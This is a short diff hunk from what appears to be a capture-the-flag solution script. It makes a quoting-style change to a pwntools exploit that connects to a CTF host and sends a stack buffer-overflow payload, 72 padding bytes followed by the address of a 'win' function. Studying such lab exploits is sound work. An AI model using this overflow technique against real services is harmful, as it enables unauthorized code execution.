@@ -49,9 +49,9 @@ int main() {
 #/usr/bin/env python3
 from pwn import *
 
-elf = ELF("./greeter")
+elf = ELF('./greeter')
 
-p = remote("challenges.ctfd.io", 30249)
+p = remote('challenges.ctfd.io', 30249)
 
 payload = b'A' * 72
 payload += p64(elf.symbols['win']) # 0x401220
